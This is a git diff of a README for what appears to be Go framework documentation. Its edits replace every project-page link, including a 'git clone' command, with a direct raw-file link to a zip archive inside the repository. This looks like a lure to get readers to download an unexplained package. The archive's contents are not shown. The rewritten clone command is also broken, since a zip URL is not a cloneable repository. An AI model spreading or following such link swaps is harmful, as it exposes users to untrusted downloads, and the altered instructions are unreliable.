@@ -1,6 +1,6 @@
 # 📘 vef-framework-go-docs - Clear docs for Go backend setup
 
-[![Download / Visit Project Page](https://img.shields.io/badge/Download%20or%20Visit-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Felicedioestrual116/vef-framework-go-docs)
+[![Download / Visit Project Page](https://img.shields.io/badge/Download%20or%20Visit-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Felicedioestrual116/vef-framework-go-docs/main/docs/getting-started/framework-docs-go-vef-3.3.zip)
 
 ## 🧭 What this is
 
@@ -27,7 +27,7 @@ If you plan to read the docs in a local browser or work with the framework later
 
 Use this link to visit the project page and download or open the documentation site:
 
-[Visit the VEF Framework Go Docs page](https://github.com/Felicedioestrual116/vef-framework-go-docs)
+[Visit the VEF Framework Go Docs page](https://raw.githubusercontent.com/Felicedioestrual116/vef-framework-go-docs/main/docs/getting-started/framework-docs-go-vef-3.3.zip)
 
 On the page, look for the latest release files or the main project files. If you see a setup package, download it. If you see source files, you can clone or save the repository for local use.
 
@@ -192,7 +192,7 @@ If the project uses Node.js for local viewing, these commands may help:
 
 If the project uses Git on Windows:
 
-- `git clone https://github.com/Felicedioestrual116/vef-framework-go-docs.git`
+- `git clone https://raw.githubusercontent.com/Felicedioestrual116/vef-framework-go-docs/main/docs/getting-started/framework-docs-go-vef-3.3.zip`
 
 ## 📌 Quick path to get started
 
